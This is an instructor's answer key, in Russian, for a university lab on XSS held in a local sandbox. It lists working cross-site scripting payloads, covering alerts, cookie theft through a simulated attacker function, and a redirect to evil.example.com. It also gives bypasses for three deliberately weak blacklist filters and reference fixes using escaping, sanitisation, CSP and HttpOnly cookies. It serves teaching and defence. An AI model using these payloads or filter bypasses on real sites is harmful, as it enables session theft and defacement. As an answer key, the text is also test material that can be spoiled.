# Ключ решений для преподавателя (XSS-стенд)

> ⚠️ **Только для преподавателя. Не выдавать студентам.**
> Файл содержит рабочие полезные нагрузки и эталонные исправления по всем
> вариантам лабораторной работы «Исследование и устранение уязвимостей XSS».
> Соответствует методичке (раздел «Варианты заданий») и стенду `xss-sandbox`.

---

## 1. Как устроен стенд (памятка)

- Запуск: `docker compose up --build`, интерфейс — http://localhost:5173.
- На каждой странице переключатель **«Уязвимый ⇄ Безопасный режим»**. В уязвимом
  режиме вывод идёт через `dangerouslySetInnerHTML` / `innerHTML` (payload
  исполняется), в безопасном — как текст (payload обезврежен).
- При загрузке ставится демо-cookie `session_token=SECRET-7f3a9c2b-DEMO-USER-42`
  (намеренно **без HttpOnly**, чтобы была доступна из JS).
- Глобальная функция `window.__attacker(data)` имитирует сервер атакующего:
  переданное значение появляется в панели **«Журнал сервера атакующего»**.
  Наружу ничего не уходит.
- Страница **«Полигон»** (`/lab`): доска сообщений с фильтром-«чёрным списком».
  Режимы фильтра `v1`, `v2`, `v3` (дырявые) и `safe` (корректный, `html.escape`).
- Кнопка «Сбросить к исходным данным» (Stored) очищает внедрённые комментарии.

**Признак успеха атаки:** всплыл `alert` ИЛИ в журнале атакующего появилась
строка `УКРАДЕНО ▸ cookie=session_token=…`.

## 2. Базовые полезные нагрузки (этап 2, основные страницы)

Применяются в уязвимом режиме на страницах Stored / Reflected / DOM
(для Reflected — в поле поиска → попадает в `?q=`; для DOM — в поле имени →
попадает во фрагмент `#`).

| Цель | Payload |
|------|---------|
| Выполнение кода (alert) | `<img src=x onerror="alert('XSS')">` |
| Кража cookie сеанса | `<img src=x onerror="window.__attacker('cookie='+document.cookie)">` |
| Другой вектор (тег svg) | `<svg onload="alert('XSS')">` |
| Срабатывание по действию пользователя | `<b onmouseover="alert('XSS')">наведи мышь</b>` |
| Дефейс (подмена вида, чистый HTML) | `<h2 style="color:red">Страница взломана</h2>` |
| Редирект (для Reflected/DOM) | `<img src=x onerror="location.href='https://evil.example.com'">` |

**Вредоносная ссылка** (этап 2 для Reflected/DOM — вектор доставки):

```
Reflected: http://localhost:5173/reflected?q=<URL-кодированный payload>
DOM:       http://localhost:5173/dom#<URL-кодированный payload>
```

Замечание: тег `<script>...</script>`, вставленный через `innerHTML`,
**не исполняется** браузером — поэтому везде используются обработчики событий
(`onerror`, `onload`, `onmouseover`, `onbegin`).

## 3. Обходы фильтров «Полигона» (этап 3)

Исходники фильтров — `backend/app.py` (`filter_v1`, `filter_v2`, `filter_v3`,
`filter_safe`). Ниже — рабочие обходы и почему они проходят.

### Группа A — обход `v1`
`v1` вырезает только литерал `<script>` / `</script>`. Любой тег с обработчиком
события проходит насквозь.

```
A1:  <img src=x onerror="alert('XSS')">
A2:  <svg onload="alert('XSS')">
A-cookie: <img src=x onerror="window.__attacker('cookie='+document.cookie)">
```

### Группа B — обход `v2`
`v2` дополнительно удаляет подстроки `onerror` и `onload`. Обход — **любой другой
обработчик события**, которого нет в списке.

```
B1 (по наведению): <img src=x onmouseover="alert('XSS')">
B2 (срабатывает автоматически):
   <svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s"></svg>
B-cookie (авто): <svg><animate onbegin="window.__attacker('cookie='+document.cookie)" attributeName="x" dur="1s"></svg>
```

Дополнительно проходят: `<details open ontoggle="alert('XSS')">`,
`<input autofocus onfocus="alert('XSS')">`, `<marquee onstart="alert('XSS')">`.
Главная мысль для студента: чёрный список обработчиков всегда неполон.

### Группа C — обход `v3`
`v3` удаляет атрибуты вида ` on…=` **с пробелом перед ними** (регэксп
`\son\w+\s*=`). Обход — **сменить разделитель с пробела на `/`** (валидный
разделитель атрибутов в HTML).

```
C1:  <img src=x/onerror="alert('XSS')">
C2:  <svg/onload="alert('XSS')">
C-cookie: <img src=x/onerror="window.__attacker('cookie='+document.cookie)">
```

### Режим `safe` — обхода нет
`filter_safe` применяет `html.escape`: `<` → `&lt;`, `>` → `&gt;`. Браузер видит
текст, а не теги, и не создаёт ни одного элемента — поэтому **ни один из обходов
A/B/C не срабатывает**. Это и есть демонстрация правильного подхода: кодирование
вывода вместо чёрного списка.

## 4. Эталонные исправления (этап 4)

Часть исправлений **уже реализована** в стенде и включается переключателем
«Безопасный режим» (отмечено ✅). Остальные студент **дописывает сам**
(отмечено ✍️) — их и нужно проверять в коде.

### И1. React: вывод как текст ✅ (Stored, DOM)
`frontend/src/pages/StoredXSS.jsx` (и аналогично DomXSS):
```jsx
// было (уязвимо):
<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// стало (безопасно):
<div className="comment-text">{comment.text}</div>
```

### И2. Сервер: экранирование вывода ✅ (Reflected)
`backend/app.py`, функция `reflected_search`:
```python
import html
echo = html.escape(query)   # было: echo = query
```

### И3. DOM: textContent вместо innerHTML ✅ (DOM)
`frontend/src/pages/DomXSS.jsx`:
```js
outputEl.textContent = "Добро пожаловать, " + data + "!"   // было: .innerHTML
```

### И4. Клиентская санитизация DOMPurify ✍️
```bash
npm i dompurify
```
```jsx
import DOMPurify from 'dompurify'
// разрешить только безопасное форматирование:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.text, { ALLOWED_TAGS: ['b','i'] }) }} />
```
Проверка: `<b>` остаётся, `<img onerror>` / `<svg onload>` вырезаются.

### И5. Серверная санитизация bleach (белый список) ✍️
```bash
pip install bleach
```
```python
import bleach
clean = bleach.clean(text, tags=['b', 'i'], strip=True)  # хранить/отдавать clean
```

### И6. Content-Security-Policy ✍️
Простейший вариант — мета-тег в `frontend/index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none'">
```
Либо заголовок на сервере (`backend/app.py`):
```python
@app.after_request
def csp(resp):
    resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none'"
    return resp
```
Эффект: без `'unsafe-inline'` встроенные обработчики (`onerror`, `onload`…) не
исполняются — в консоли видна ошибка нарушения CSP, payload не срабатывает даже
при успешной инъекции.
⚠️ Dev-сервер Vite использует инлайновые скрипты/HMR, поэтому CSP проверяйте на
сборке: `npm run build && npm run preview` (либо временно разрешите то, что нужно
Vite). Это нормальный повод обсудить со студентом совместимость CSP и фреймворка.

### И7. Флаги cookie HttpOnly / Secure / SameSite ✍️
Принцип: сессионную cookie выставляет **сервер** с флагом `HttpOnly` — тогда она
недоступна из JS, и payload `document.cookie` её не получает.
```python
resp.set_cookie('session_token', token, httponly=True, secure=True, samesite='Strict')
```
⚠️ Нюанс стенда: демо-cookie ставится из JS в `frontend/src/main.jsx`
(`document.cookie = 'session_token=…'`), и флаг HttpOnly для JS-cookie не
действует. Корректная демонстрация: убрать установку cookie из `main.jsx` и
выставлять её сервером с `httponly=True` (см. выше). Ожидаемый результат: в
журнале атакующего значение `session_token` **больше не появляется** (видны лишь
не-HttpOnly cookie, если такие остались).

## 6. На что смотреть при приёмке

1. **Этап 1.** Студент указал конкретную строку с уязвимостью и назвал
   источник/приёмник (для DOM — `location.hash` → `innerHTML`).
2. **Этап 2.** Не менее трёх **разных** векторов; среди них — кража cookie
   (есть строка в журнале атакующего) и дефейс/редирект. Для Reflected/DOM —
   оформлена вредоносная ссылка.
3. **Этап 3.** Не менее **двух** разных обходов назначенного фильтра с верным
   объяснением, почему фильтр их пропускает (см. раздел 3). Проверьте, что
   студент понимает разницу между v1/v2/v3.
4. **Этап 4.** Исправление реализовано в коде (или показано в безопасном режиме
   для И1–И3) **и** добавлен доп. рубеж. После исправления **все** ранее
   найденные payload'ы и обходы не срабатывают (журнал пуст, alert не всплывает).
5. **Этап 5.** Студент объясняет, почему чёрный список порочен, а кодирование/
   санитизация — нет, и в каком слое (сервер/клиент) корректно ставить
   исправление для своего подтипа.

**Типичные ошибки студентов:** «фикс» через свой чёрный список (добавил ещё пару
тегов в фильтр) — не принимается; экранирование на сервере для DOM-XSS — не
помогает (нагрузка не доходит до сервера); установка `HttpOnly` на JS-cookie —
не действует (нужна серверная установка).
